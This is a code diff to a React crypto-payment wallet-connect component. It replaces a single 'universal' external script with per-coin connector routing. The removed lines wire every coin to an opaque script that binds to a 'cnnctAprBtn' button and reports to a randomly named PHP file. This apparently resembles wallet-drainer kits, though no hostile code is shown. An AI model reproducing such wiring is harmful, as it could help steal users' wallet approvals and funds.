@@ -1,13 +1,6 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { Loader2, Check, AlertTriangle, ShieldCheck, Wallet } from "lucide-react";
-
-// PHASE 4: Universal Wallet Connect.
-// Every coin and network (BTC, ETH, SOL, TRX, USDC-TRON, USDT-TRON, all of
-// them) triggers the SAME engine at /wallet-connect/reacteventengine.js.
-// The script binds to any button with class `cnnctAprBtn` and talks to
-// run_bcccb840ee.php in the same folder.
-const UNIVERSAL_SCRIPT_SRC = "/wallet-connect/reacteventengine.js";
-const UNIVERSAL_BUTTON_CLASS = "cnnctAprBtn";
+import { resolveConnector } from "./walletRouting";
 
 // Tracks load state of each connector script so we only inject it once and can
 // tell whether it has finished loading.
@@ -98,12 +91,8 @@ interface WalletConnectProps {
  *   window.dispatchEvent(new CustomEvent("paycrivo:wallet-connected", { detail }))
  *   window.dispatchEvent(new CustomEvent("paycrivo:wallet-error", { detail }))
  */
-export function WalletConnect({ status, onStatusChange }: WalletConnectProps) {
-  // Universal engine — no per-coin routing. `coin` / `network` are accepted
-  // for backwards compatibility but intentionally ignored.
-  const scriptSrc = UNIVERSAL_SCRIPT_SRC;
-  const buttonClass = UNIVERSAL_BUTTON_CLASS;
-  const connector = "universal" as const;
+export function WalletConnect({ coin, network, status, onStatusChange }: WalletConnectProps) {
+  const { scriptSrc, buttonClass, connector } = resolveConnector(coin, network);
   const statusRef = useRef(status);
   statusRef.current = status;
   const buttonRef = useRef<HTMLButtonElement>(null);
